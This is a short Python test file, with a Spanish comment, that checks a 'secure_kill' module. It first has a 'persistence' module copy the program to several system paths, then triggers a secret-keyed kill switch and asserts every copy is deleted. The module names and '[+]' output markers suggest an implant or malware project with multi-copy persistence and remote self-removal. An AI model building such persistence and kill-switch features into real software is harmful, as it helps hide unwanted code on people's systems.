import os
import sys
from modules.secure_kill import run as secure_kill_run, KILL_SECRET
from modules.persistence import persist_multicopy, get_system_paths

def test_secure_kill_removes_all_files(monkeypatch):
    persist_multicopy()
    monkeypatch.setattr(sys, "exit", lambda code=0: None)
    result = secure_kill_run("kill", KILL_SECRET)
    # Todas las copias deberían eliminarse
    for p in get_system_paths():
        assert not os.path.exists(p)
    assert "[+]" in result
